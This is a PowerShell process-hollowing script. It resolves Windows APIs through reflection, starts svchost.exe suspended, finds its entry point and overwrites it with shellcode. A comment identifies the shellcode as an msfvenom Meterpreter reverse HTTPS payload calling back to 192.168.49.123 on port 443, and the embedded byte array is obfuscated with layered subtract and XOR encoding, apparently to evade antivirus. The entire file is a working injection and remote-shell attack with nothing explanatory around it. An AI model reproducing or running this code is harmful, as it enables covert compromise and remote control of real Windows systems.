Function Standard_Process_Hollowing_Delegate_InMemory {

function Invoke-FunctionLookup {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [string] $moduleName,
        [Parameter(Position = 1, Mandatory = $true)] 
        [string] $functionName
    )

    $systemType = ([AppDomain]::CurrentDomain.GetAssemblies() | 
        Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\')[-1] -eq 'System.dll' }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $getProcAddressMethod = $systemType.GetMethods() | Where-Object { $_.Name -eq "GetProcAddress" }
    $moduleHandle = $systemType.GetMethod('GetModuleHandle').Invoke($null, @($moduleName))
    return $getProcAddressMethod[0].Invoke($null, @($moduleHandle, $functionName))
}

# Function to dynamically create delegates
function Invoke-GetDelegate {
    Param (
        [Parameter(Position = 0, Mandatory = $true)] 
        [Type[]] $parameterTypes,
        [Parameter(Position = 1, Mandatory = $false)] 
        [Type] $returnType = [Void]
    )

    $assemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    )

    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)

    $typeBuilder = $moduleBuilder.DefineType(
        'MyDelegateType', 
        [System.Reflection.TypeAttributes]::Class -bor 
        [System.Reflection.TypeAttributes]::Public -bor 
        [System.Reflection.TypeAttributes]::Sealed -bor 
        [System.Reflection.TypeAttributes]::AnsiClass -bor 
        [System.Reflection.TypeAttributes]::AutoClass, 
        [System.MulticastDelegate]
    )

    $constructorBuilder = $typeBuilder.DefineConstructor(
        [System.Reflection.MethodAttributes]::RTSpecialName -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::Public,
        [System.Reflection.CallingConventions]::Standard,
        $parameterTypes
    )

    $constructorBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    $methodBuilder = $typeBuilder.DefineMethod(
        'Invoke',
        [System.Reflection.MethodAttributes]::Public -bor 
        [System.Reflection.MethodAttributes]::HideBySig -bor 
        [System.Reflection.MethodAttributes]::NewSlot -bor 
        [System.Reflection.MethodAttributes]::Virtual,
        $returnType,
        $parameterTypes
    )

    $methodBuilder.SetImplementationFlags(
        [System.Reflection.MethodImplAttributes]::Runtime -bor 
        [System.Reflection.MethodImplAttributes]::Managed
    )

    return $typeBuilder.CreateType()
}

# Load necessary types from System.dll assembly using reflection
$assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
$unsafeMethodsType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.UnsafeNativeMethods') }
$nativeMethodsType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods') }

# Load some structures we need for various functions
$startupInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.NativeMethods+STARTUPINFO') }
$processInformationType = $assemblies | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1] -eq 'System.dll' } | ForEach-Object { $_.GetType('Microsoft.Win32.SafeNativeMethods+PROCESS_INFORMATION') }

# Define ConstructorInfo arrays from those loaded above
$startupInformation = $startupInformationType.GetConstructors().Invoke($null)
$processInformation = $processInformationType.GetConstructors().Invoke($null)

# Obtain the required functions via reflection: GetModuleHandle, GetProcAddress and CreateProcess
$GetModuleHandle = $unsafeMethodsType.GetMethod('GetModuleHandle')
$GetProcAddress = $unsafeMethodsType.GetMethod('GetProcAddress', [reflection.bindingflags]'Public,Static', $null, [System.Reflection.CallingConventions]::Any, @([System.IntPtr], [string]), $null);
$CreateProcess = $nativeMethodsType.GetMethod("CreateProcess")

$ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "ReadProcessMemory"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [byte[]], [int], [IntPtr]) ([Bool]))
) 

$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "WriteProcessMemory"), 
    (Invoke-GetDelegate @([IntPtr], [IntPtr], [byte[]], [Int], [IntPtr]) ([Bool]))
)

$ResumeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "ResumeThread"), 
    (Invoke-GetDelegate @([IntPtr]) ([void]))
)

$CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "Kernel32.dll" -functionName "CloseHandle"), 
    (Invoke-GetDelegate @([IntPtr]) ([bool]))
)

# Get function pointers for ntdll functions
$ZwQueryInformationProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
    (Invoke-FunctionLookup -moduleName "ntdll.dll" -functionName "ZwQueryInformationProcess"), 
    (Invoke-GetDelegate @([IntPtr], [Int], [Byte[]], [UInt32], [UInt32]) ([int]))
)

# Get current directory path
$CurrentPath = (Get-Item -Path "." -Verbose).FullName

#CreateProcess
$cmd = [System.Text.StringBuilder]::new("C:\Windows\System32\svchost.exe")
$CreateProcess.Invoke($null, @($null, $cmd, $null, $null, $false, 0x4, [IntPtr]::Zero, $CurrentPath, $startupInformation, $processInformation))  > $null

# Obtain the required handles from the PROCESS_INFORMATION structure
$hThread = $processInformation.hThread
$hProcess = $processInformation.hProcess

# Query process information to get the PEB address of the process
$processBasicInformation = [System.Byte[]]::CreateInstance([System.Byte], 48)
$tmp = [UInt32]0
$ZwQueryInformationProcess.Invoke($hProcess, 0, $processBasicInformation, $processBasicInformation.Length, $tmp)  > $null
$pebBaseAddress = [BitConverter]::ToInt64($processBasicInformation, 8)
$ptrToImageBase = [IntPtr]($pebBaseAddress + 0x10)

# Read the memory to get the base address of the executable
[byte[]] $addrBuf = New-Object byte[] ([IntPtr]::Size)
$readSuccess = $ReadProcessMemory.Invoke($hProcess, $ptrToImageBase, $addrBuf, $addrBuf.Length, [IntPtr]::Zero)  > $null

# Calculate the base address of svchost.exe
$svchostBase = [IntPtr]::Zero
if ([IntPtr]::Size -eq 8) {
    $svchostBase = [IntPtr]::new([System.BitConverter]::ToInt64($addrBuf, [IntPtr]::Zero))
} else {
    $svchostBase = [IntPtr]::new([System.BitConverter]::ToInt32($addrBuf, [IntPtr]::Zero))
}

# Convert svchostBase to UInt64 for entry point calculation
$svchostBase64 = [UInt64]$svchostBase.ToInt64()

# Read more memory to locate the entry point
[byte[]] $data = New-Object byte[] 0x200
$ReadProcessMemory.Invoke($hProcess, $svchostBase, $data, 0x200, [IntPtr]::Zero)  > $null

# Get the entry point of the executable
$e_lfanew_offset = [BitConverter]::ToUInt32($data, 0x3C)
$opthdr = $e_lfanew_offset + 0x28
$entrypoint_rva = [BitConverter]::ToUInt32($data, [int]$opthdr)

# Calculate the address of the entry point
$addressOfEntryPoint = [IntPtr]::new($entrypoint_rva + $svchostBase64)

# /usr/bin/msfvenom -f csharp -a x64 -p windows/x64/meterpreter/reverse_winhttps LHOST=192.168.49.123 LPORT=443 EXITFUNC=thread
[Byte[]] $buf = 0xf,0x53,0x9c,0xe7,0xb,0xf3,0xdf,0x1b,0x1b,0x1b,0x5a,0x6a,0x5a,0x6b,0x55,0x53,0x4a,0xd5,0x6a,0x51,0x66,0x53,0x94,0x55,0x7b,0x53,0x94,0x55,0x23,0x53,0x94,0x55,0x3b,0x53,0x94,0x75,0x6b,0x5e,0x4a,0xd2,0x53,0x20,0xb8,0x5d,0x5d,0x53,0x4a,0xdb,0xbf,0x4f,0x7a,0x8f,0x5,0x3f,0x3b,0x5a,0xda,0xd2,0x1e,0x5a,0x1a,0xda,0xe5,0xfe,0x55,0x5a,0x6a,0x53,0x94,0x55,0x3b,0x94,0x45,0x4f,0x53,0x1a,0xeb,0x61,0x9a,0x83,0x23,0x14,0x5,0x20,0x86,0x75,0x1b,0x1b,0x1b,0x94,0x9b,0x93,0x1b,0x1b,0x1b,0x53,0x86,0xdb,0x77,0x68,0x53,0x1a,0xeb,0x94,0x53,0x23,0x6b,0x47,0x94,0x5b,0x3b,0x52,0x1a,0xeb,0xfc,0x51,0x53,0x10,0xd2,0x5e,0x4a,0xd2,0x5a,0x94,0x37,0x93,0x53,0x1a,0xd1,0x53,0x4a,0xdb,0xbf,0x5a,0xda,0xd2,0x1e,0x5a,0x1a,0xda,0x43,0xfb,0x76,0xa,0x5f,0x1c,0x5f,0x27,0x13,0x46,0x42,0xea,0x76,0xe3,0x63,0x47,0x94,0x5b,0x27,0x52,0x1a,0xeb,0x61,0x5a,0x94,0x1f,0x53,0x47,0x94,0x5b,0x2f,0x52,0x1a,0xeb,0x5a,0x94,0x7,0x93,0x5a,0x63,0x53,0x1a,0xeb,0x5a,0x63,0x69,0x62,0x6d,0x5a,0x63,0x5a,0x62,0x5a,0x6d,0x53,0x9c,0xff,0x3b,0x5a,0x55,0x10,0xfb,0x63,0x5a,0x62,0x6d,0x53,0x94,0x15,0xf2,0x54,0x10,0x10,0x10,0x6e,0x53,0x4a,0xe4,0x6c,0x52,0xc9,0x78,0x72,0x79,0x73,0x77,0x77,0x8b,0x1b,0x5a,0x51,0x53,0x92,0xfa,0x52,0xc8,0xc5,0x5f,0x78,0x21,0x8,0x10,0xd6,0x6c,0x6c,0x53,0x92,0xfa,0x6c,0x6d,0x5e,0x4a,0xdb,0x5e,0x4a,0xd2,0x6c,0x6c,0x52,0xcd,0x7,0x30,0xae,0xc4,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x52,0x92,0xc7,0xf3,0x29,0x1b,0x1b,0x1b,0x4a,0x1b,0x42,0x1b,0x35,0x1b,0x39,0x1b,0x4a,0x1b,0x31,0x1b,0x43,0x1b,0x39,0x1b,0x37,0x1b,0x42,0x1b,0x39,0x1b,0x4a,0x1b,0x35,0x1b,0x4c,0x1b,0x1b,0x1b,0x6d,0x53,0x92,0xda,0x52,0xc8,0xdb,0xc4,0x1a,0x1b,0x1b,0x5e,0x4a,0xd2,0x52,0xcd,0x41,0xa4,0x29,0xc5,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0xf3,0xa3,0x1a,0x1b,0x1b,0x73,0x1b,0x77,0x1b,0x77,0x1b,0x8b,0x1b,0x8c,0x1b,0x4d,0x1b,0x40,0x1b,0x40,0x1b,0x4a,0x1b,0x42,0x1b,0x35,0x1b,0x39,0x1b,0x4a,0x1b,0x31,0x1b,0x43,0x1b,0x39,0x1b,0x37,0x1b,0x42,0x1b,0x39,0x1b,0x4a,0x1b,0x35,0x1b,0x4c,0x1b,0x40,0x1b,0x56,0x1b,0x5c,0x1b,0x5c,0x1b,0x36,0x1b,0x76,0x1b,0x41,0x1b,0x76,0x1b,0x75,0x1b,0x6c,0x1b,0x5d,0x1b,0x82,0x1b,0x67,0x1b,0x62,0x1b,0x5d,0x1b,0x83,0x1b,0x72,0x1b,0x42,0x1b,0x55,0x1b,0x5f,0x1b,0x8b,0x1b,0x62,0x1b,0x78,0x1b,0x52,0x1b,0x55,0x1b,0x56,0x1b,0x66,0x1b,0x37,0x1b,0x71,0x1b,0x3e,0x1b,0x74,0x1b,0x47,0x1b,0x8b,0x1b,0x77,0x1b,0x5f,0x1b,0x6b,0x1b,0x4a,0x1b,0x76,0x1b,0x58,0x1b,0x6d,0x1b,0x8d,0x1b,0x45,0x1b,0x42,0x1b,0x8b,0x1b,0x56,0x1b,0x43,0x1b,0x63,0x1b,0x53,0x1b,0x5f,0x1b,0x51,0x1b,0x67,0x1b,0x8a,0x1b,0x4c,0x1b,0x5f,0x1b,0x6c,0x1b,0x7d,0x1b,0x71,0x1b,0x65,0x1b,0x7c,0x1b,0x53,0x1b,0x76,0x1b,0x3e,0x1b,0x7c,0x1b,0x79,0x1b,0x68,0x1b,0x4a,0x1b,0x66,0x1b,0x62,0x1b,0x78,0x1b,0x5a,0x1b,0x78,0x1b,0x5e,0x1b,0x42,0x1b,0x43,0x1b,0x6c,0x1b,0x72,0x1b,0x37,0x1b,0x4a,0x1b,0x4b,0x1b,0x3e,0x1b,0x47,0x1b,0x78,0x1b,0x72,0x1b,0x6d,0x1b,0x4b,0x1b,0x71,0x1b,0x41,0x1b,0x68,0x1b,0x58,0x1b,0x5f,0x1b,0x80,0x1b,0x45,0x1b,0x41,0x1b,0x7c,0x1b,0x8c,0x1b,0x80,0x1b,0x76,0x1b,0x54,0x1b,0x80,0x1b,0x76,0x1b,0x72,0x1b,0x53,0x1b,0x41,0x1b,0x77,0x1b,0x73,0x1b,0x42,0x1b,0x41,0x1b,0x4c,0x1b,0x4b,0x1b,0x83,0x1b,0x76,0x1b,0x66,0x1b,0x41,0x1b,0x46,0x1b,0x36,0x1b,0x73,0x1b,0x48,0x1b,0x51,0x1b,0x38,0x1b,0x36,0x1b,0x79,0x1b,0x57,0x1b,0x54,0x1b,0x48,0x1b,0x55,0x1b,0x6d,0x1b,0x7c,0x1b,0x67,0x1b,0x63,0x1b,0x5e,0x1b,0x75,0x1b,0x82,0x1b,0x58,0x1b,0x6d,0x1b,0x7a,0x1b,0x57,0x1b,0x46,0x1b,0x4b,0x1b,0x6b,0x1b,0x56,0x1b,0x73,0x1b,0x3e,0x1b,0x31,0x1b,0x65,0x1b,0x68,0x1b,0x8c,0x1b,0x6b,0x1b,0x4a,0x1b,0x53,0x1b,0x82,0x1b,0x79,0x1b,0x6d,0x1b,0x75,0x1b,0x70,0x1b,0x6d,0x1b,0x56,0x1b,0x4c,0x1b,0x6b,0x1b,0x37,0x1b,0x35,0x1b,0x8a,0x1b,0x4b,0x1b,0x80,0x1b,0x4a,0x1b,0x6b,0x1b,0x6b,0x1b,0x80,0x1b,0x80,0x1b,0x60,0x1b,0x62,0x1b,0x52,0x1b,0x78,0x1b,0x48,0x1b,0x75,0x1b,0x7f,0x1b,0x4b,0x1b,0x60,0x1b,0x31,0x1b,0x6b,0x1b,0x41,0x1b,0x8c,0x1b,0x1b,0x1b,0x53,0x92,0xda,0x6c,0x6d,0x5a,0x63,0x5e,0x92,0xc6,0x52,0x9c,0xdb,0x3f,0x5e,0x4a,0xd2,0x6c,0x53,0xc8,0xdb,0x1b,0x1a,0x9b,0x1b,0x6b,0x6c,0x6c,0x52,0xc8,0xc5,0xa3,0x2b,0xcc,0x64,0x10,0xd6,0x53,0x92,0xc1,0x53,0x9c,0xf3,0x3b,0x53,0x92,0xe8,0x53,0x92,0x2,0x52,0xc8,0xc5,0x3a,0xa8,0x14,0x7b,0x10,0xd6,0x86,0xdb,0x20,0x87,0x7e,0x1b,0x1b,0x1b,0x53,0x94,0x48,0x13,0x86,0xdb,0x77,0x4d,0x53,0x92,0xe2,0x53,0x10,0xda,0x53,0xda,0xfa,0x3b,0x6a,0x6c,0x6b,0x53,0xc3,0x1c,0x1b,0x1b,0x1b,0x1c,0x1b,0x1b,0x1b,0x6b,0x52,0x92,0xfb,0x53,0x9c,0xff,0x3b,0x53,0x92,0xe8,0x52,0x92,0x2,0x5f,0x92,0xfa,0x5f,0x92,0xfd,0x52,0xc8,0xc5,0xed,0xee,0xfd,0x52,0x10,0xd6,0x86,0xdb,0x77,0x3e,0xf4,0x15,0x53,0x94,0x48,0x2b,0x86,0xdb,0x77,0x3c,0x53,0x9c,0xc8,0x13,0x7d,0x1c,0x63,0x53,0x92,0x8,0x52,0x92,0x3,0x7d,0x23,0x5a,0x62,0x53,0x92,0xa,0x7d,0x21,0x6d,0x52,0xcd,0xec,0x63,0xae,0xd9,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x7d,0x1d,0x70,0x53,0x92,0xa,0x7d,0x30,0x6d,0x55,0x73,0x1b,0x4c,0x1b,0x1b,0x52,0x92,0xfb,0x7d,0x7,0x5a,0x62,0x52,0xcd,0xec,0x63,0xae,0xd9,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x5e,0x4a,0xdb,0x6c,0x6d,0x53,0x92,0xa,0x5e,0x4a,0xd2,0x6c,0x6c,0x6c,0x6c,0x52,0xcd,0x96,0x63,0xc4,0xaa,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x86,0xdb,0x76,0x1f,0x53,0x10,0xe0,0x77,0x5,0xf4,0xc4,0xf3,0x73,0x1b,0x1b,0x1b,0x53,0x92,0xa,0x6c,0x6d,0x52,0xc8,0xc5,0x6,0x93,0xae,0x8b,0x10,0xd6,0x86,0xdb,0x77,0xf2,0x6c,0x62,0x7d,0x5b,0x6d,0x52,0x92,0xea,0xda,0xe5,0x2b,0x52,0xc8,0xdb,0x1b,0x2b,0x1b,0x1b,0x52,0xcd,0x63,0xa7,0x6c,0xe6,0x1b,0x1b,0x1b,0x1b,0x10,0xd6,0x53,0xac,0x6c,0x6c,0x53,0x92,0xe8,0x53,0x92,0xa,0x53,0x92,0xed,0x52,0xc8,0xdb,0x1b,0x3b,0x1b,0x1b,0x52,0x92,0x2,0x52,0xc8,0xc5,0x7f,0x32,0x27,0x89,0x10,0xd6,0x53,0x9c,0xc7,0x3b,0x86,0xdb,0x20,0x87,0xb0,0x10,0x10,0x10,0x61,0x94,0x8,0x53,0x1a,0xdc,0x86,0xdb,0x76,0xea,0x63,0xdc,0x63,0x7d,0x1b,0x62,0xc4,0xfb,0x2e,0x3d,0x1d,0x5a,0x92,0xed,0x10,0xd6

for ($i = 0; $i -lt $buf.Length; $i++) {
    $decoded = ($buf[$i] - 17) % 256
    if ($decoded -lt 0) { $decoded += 256 }
    $buf[$i] = $decoded
}

for ($i = 0; $i -lt $buf.Length; $i++) {
    $buf[$i] = $buf[$i] -bxor 0x74
}

for ($i = 0; $i -lt $buf.Length; $i++) {
    $decoded = ($buf[$i] - 5) % 256
    if ($decoded -lt 0) { $decoded += 256 }
    $buf[$i] = $decoded
}

for ($i = 0; $i -lt $buf.Length; $i++) {
    $buf[$i] = $buf[$i] -bxor 0x79
}

# Write the shellcode to the entry point of the executable
$WriteProcessMemory.Invoke($hProcess, $addressOfEntryPoint, $buf, $buf.Length, [IntPtr]::Zero) > $null

# Resume the main thread of the process
$ResumeThread.Invoke($processInformation.hThread) > $null

# Cleanup
$CloseHandle.Invoke($processInformation.hProcess) > $null
$CloseHandle.Invoke($processInformation.hThread) > $null

}

Standard_Process_Hollowing_Delegate_InMemory